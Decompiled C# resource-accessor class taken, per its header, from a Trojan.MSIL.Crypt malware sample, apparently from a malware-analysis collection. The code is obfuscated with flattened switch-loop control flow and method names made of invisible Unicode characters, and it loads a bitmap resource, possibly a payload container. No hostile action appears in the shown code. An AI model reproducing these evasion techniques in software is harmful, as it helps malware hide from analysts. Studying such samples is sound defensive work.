// Decompiled with JetBrains decompiler
// Type: IReadOnlyL.InvalidCastExcept
// Assembly: DictionaryValueCollect, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 264A7E74-FCA9-4101-A215-90F8B6150D1A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan.MSIL.Crypt.hzzu-0a11971438302748e2f40e97f73af5e24c71212b30c9d6a5aff7ff102e662c94.exe

using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace IReadOnlyL
{
  [CompilerGenerated]
  [GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
  [DebuggerNonUserCode]
  internal class InvalidCastExcept
  {
    private static ResourceManager resourceMan;
    private static CultureInfo resourceCulture;

    internal InvalidCastExcept()
    {
label_1:
      int num1 = -123654446;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -849131237)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -1438433274 ^ 1633625808;
            continue;
          case 1:
            num1 = (int) num2 * -1768379598 ^ 1621547109;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static ResourceManager ResourceManager
    {
      get
      {
label_1:
        int num1 = -966890033;
        ResourceManager resourceMan;
        ResourceManager resourceManager;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1475985622)) % 8U)
          {
            case 0:
              num1 = (int) num2 * -1767280871 ^ -654594216;
              continue;
            case 1:
              resourceMan = InvalidCastExcept.resourceMan;
              num1 = -770477123;
              continue;
            case 2:
              resourceManager = InvalidCastExcept.\u206C‫‏‬‬​​​⁬‫⁭⁬‭⁭⁯​‫‪‮⁬⁪​⁪⁮‬⁭⁭⁭​⁪‮‍​‫‌⁯⁯‮‭⁮‮("AutoJack.Properties.Resources", InvalidCastExcept.\u200B‏‌⁪⁮‍⁯‌‭​⁮‏⁮‍‏⁮‬​‪‏‍‎⁯⁪⁮‎​‎‎⁫‍⁮⁭‍⁬‪‏⁮⁯‮(InvalidCastExcept.\u206A‭​‪‎‏​⁯⁪‫‍‍⁬⁫⁮‮‌⁬‬⁬‮‮‪⁪‌⁪⁯⁯⁪‌⁪‪‍⁪‬‌⁯⁫‪‍‮(__typeref (InvalidCastExcept))));
              num1 = (int) num2 * -789825642 ^ 2041983384;
              continue;
            case 3:
              goto label_1;
            case 4:
              num1 = (int) num2 * -801411591 ^ 462139423;
              continue;
            case 5:
              int num3 = InvalidCastExcept.resourceMan == null ? 969279814 : (num3 = 1382256087);
              num1 = num3 ^ (int) num2 * -1317328516;
              continue;
            case 6:
              InvalidCastExcept.resourceMan = resourceManager;
              num1 = (int) num2 * -1345441287 ^ 2066176224;
              continue;
            default:
              goto label_9;
          }
        }
label_9:
        return resourceMan;
      }
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static CultureInfo Culture
    {
      get
      {
        CultureInfo resourceCulture = InvalidCastExcept.resourceCulture;
label_1:
        int num1 = -331552140;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1198448051)) % 3U)
          {
            case 1:
              num1 = (int) num2 * 1781059328 ^ -1524510643;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_4;
          }
        }
label_4:
        return resourceCulture;
      }
      set => InvalidCastExcept.resourceCulture = value;
    }

    internal static Bitmap AsymmetricSignatureFormat
    {
      get
      {
label_1:
        int num1 = -1739956378;
        object obj;
        Bitmap asymmetricSignatureFormat;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -335051016)) % 5U)
          {
            case 0:
              goto label_1;
            case 2:
              num1 = (int) num2 * -1510626021 ^ -1677215063;
              continue;
            case 3:
              obj = InvalidCastExcept.\u206A⁮⁪⁮⁭‮‫‫‏⁪⁬‏⁪‌⁬⁫⁫‭⁬⁭⁫‏‌‎‮‬⁬⁮​⁬⁪⁯‪‭‍‬‮‪⁬‬‮(InvalidCastExcept.ResourceManager, nameof (AsymmetricSignatureFormat), InvalidCastExcept.resourceCulture);
              num1 = (int) num2 * -177864017 ^ -693283525;
              continue;
            case 4:
              asymmetricSignatureFormat = (Bitmap) obj;
              num1 = (int) num2 * 132222891 ^ 943059172;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        return asymmetricSignatureFormat;
      }
    }

    static Type \u206A‭​‪‎‏​⁯⁪‫‍‍⁬⁫⁮‮‌⁬‬⁬‮‮‪⁪‌⁪⁯⁯⁪‌⁪‪‍⁪‬‌⁯⁫‪‍‮([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

    static Assembly \u200B‏‌⁪⁮‍⁯‌‭​⁮‏⁮‍‏⁮‬​‪‏‍‎⁯⁪⁮‎​‎‎⁫‍⁮⁭‍⁬‪‏⁮⁯‮([In] Type obj0) => obj0.Assembly;

    static ResourceManager \u206C‫‏‬‬​​​⁬‫⁭⁬‭⁭⁯​‫‪‮⁬⁪​⁪⁮‬⁭⁭⁭​⁪‮‍​‫‌⁯⁯‮‭⁮‮(
      [In] string obj0,
      [In] Assembly obj1)
    {
      return new ResourceManager(obj0, obj1);
    }

    static object \u206A⁮⁪⁮⁭‮‫‫‏⁪⁬‏⁪‌⁬⁫⁫‭⁬⁭⁫‏‌‎‮‬⁬⁮​⁬⁪⁯‪‭‍‬‮‪⁬‬‮(
      [In] ResourceManager obj0,
      [In] string obj1,
      [In] CultureInfo obj2)
    {
      return obj0.GetObject(obj1, obj2);
    }
  }
}
